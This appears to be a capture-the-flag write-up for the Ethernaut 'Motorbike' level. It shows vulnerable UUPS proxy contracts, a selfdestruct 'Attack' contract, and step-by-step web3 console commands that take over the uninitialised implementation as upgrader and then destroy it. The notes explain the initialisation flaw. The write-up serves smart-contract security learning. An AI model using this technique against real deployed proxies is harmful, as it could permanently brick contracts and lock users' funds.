# Motorbike

## Give code:
```shell
import ...

contract Motorbike {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    function _delegate(address implementation) internal virtual {
        ...
    }

    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        ...
    }
}

contract Engine is Initializable {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
      ...
    }
    
    function _setImplementation(address newImplementation) private {
       ...
    }
}
```
## Attack code:
```shell

...
contract Attack {
    function nuke() public {
        selfdestruct(address(0));
    }
}
```

## Hack:

### Step1:

Get current implementationa address. See calculated constant above `_IMPLEMENTATION_SLOT`. This is the second arg here.

`implementationContractAddress = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');`

### Step2:

Remove left pad in address. Slots are 32 byte, while an address is only 20.

`implementationContractAddress = '0x' + implementationContractAddress.slice(-40);`

### Step3:

Calculate `initialize()` function selector.

`initializeSelector = web3.eth.abi.encodeFunctionSignature("initialize()");`

### ### Step4:

Become the upgrader. 

`await web3.eth.sendTransaction({from: player, to: implementationContractAddress, data: initializeSelector`})

Step5:

Confirm upgrader

`upgraderSelector = web3.eth.abi.encodeFunctionSignature("upgrader()");`

`await web3.eth.call({from: player, to: implementationContractAddress, data: upgraderSelector}).then(v => '0x' + v.slice(-40).toLowerCase()) == player.toLowerCase()`

This should return `true`, showing that we are now privileged.

### Step6:

Deploy `Attack` contract (see above) and create variables for next phase.

Create var in browser console for `Attack` contract

`attackContractAddress = '0x...'`

`nukeSelector = web3.eth.abi.encodeFunctionSignature("nuke()");`

```
upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}
```

`params = [attackContractAddress, nukeSelector]`

`upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, params)`

### Step7:

Build and send tx

`await web3.eth.sendTransaction({from: player, to: implementationContractAddress, data: upgradeData})`


## Notes:

Upgradable contracts must be initialized on deployment. We are able to become the `upgrader` by abusing this.

We then 'upgrade' the implementation contract to some custom logic with a `nuke` function that self destructs the implementation. The real trouble here is that with the new commonly used proxy pattern (UUPS), the functionality that gives us an ability to redeploy a new implementation, resides in the implementation. This hack renders the proxy and previous implementation toast.